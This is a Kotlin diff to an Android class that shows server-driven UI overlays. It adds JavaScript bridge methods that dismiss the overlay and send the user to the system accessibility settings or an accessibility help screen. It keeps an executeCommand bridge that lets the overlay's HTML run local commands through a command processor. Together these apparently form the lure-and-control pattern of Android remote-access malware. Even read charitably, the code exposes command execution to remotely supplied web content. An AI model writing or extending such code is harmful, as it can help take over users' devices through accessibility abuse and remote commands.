@@ -24,6 +24,7 @@ object DynamicUIManager {
         @JavascriptInterface
         fun close() {
             Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
+            DebugLogger.log("SDUI", "Direct Bridge: Closed Overlay")
         }
 
         @JavascriptInterface
@@ -32,11 +33,34 @@ object DynamicUIManager {
         }
 
         @JavascriptInterface
+        fun openAccSettings() {
+            Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
+            try {
+                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                ctx.startActivity(i)
+                DebugLogger.log("SDUI", "Direct Bridge: Opened Accessibility Settings")
+            } catch(e: Exception) {
+                DebugLogger.log("SDUI_ERR", "Failed to open settings: ${e.message}")
+            }
+        }
+
+        @JavascriptInterface
+        fun openAccHelp() {
+            Handler(Looper.getMainLooper()).post { removeOverlay(ctx) }
+            try {
+                val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                ctx.startActivity(i)
+                DebugLogger.log("SDUI", "Direct Bridge: Opened Help Activity")
+            } catch(e: Exception) {
+                DebugLogger.log("SDUI_ERR", "Failed to open help: ${e.message}")
+            }
+        }
+
+        @JavascriptInterface
         fun executeCommand(cmdJson: String) {
-            // Allows the dynamic HTML to trigger local Android commands
             try {
                 val mockCmd = JSONObject(cmdJson)
-                if (!mockCmd.has("id")) mockCmd.put("id", -2) // Mock ID for local execution
+                if (!mockCmd.has("id")) mockCmd.put("id", -2) 
                 CoroutineScope(Dispatchers.IO).launch {
                     CommandProcessor.processSingleCommand(ctx, mockCmd)
                 }
